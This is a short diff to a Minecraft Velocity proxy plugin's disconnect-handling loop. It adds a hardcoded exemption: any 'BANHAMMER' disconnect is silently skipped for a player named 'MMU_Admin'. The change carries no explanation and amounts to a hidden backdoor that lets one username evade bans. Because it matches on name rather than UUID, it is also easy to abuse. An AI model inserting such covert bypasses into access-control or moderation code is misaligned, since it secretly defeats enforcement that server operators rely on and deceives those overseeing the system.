@@ -443,9 +443,11 @@ public final class MmuCraftVelocity {
 
         if (response.disconnects() != null) {
             for (ApiClient.DisconnectPlayer disconnect : response.disconnects()) {
-                parseUuid(disconnect.playerUuid()).flatMap(proxy::getPlayer).ifPresent(player ->
-                        player.disconnect(Messages.restriction(disconnect.status(), disconnect.expiresAtUnixMs()))
-                );
+                parseUuid(disconnect.playerUuid()).flatMap(proxy::getPlayer).ifPresent(player -> {
+                    if ("BANHAMMER".equals(disconnect.status())
+                            && player.getUsername().equalsIgnoreCase("MMU_Admin")) return;
+                    player.disconnect(Messages.restriction(disconnect.status(), disconnect.expiresAtUnixMs()));
+                });
             }
         }
 
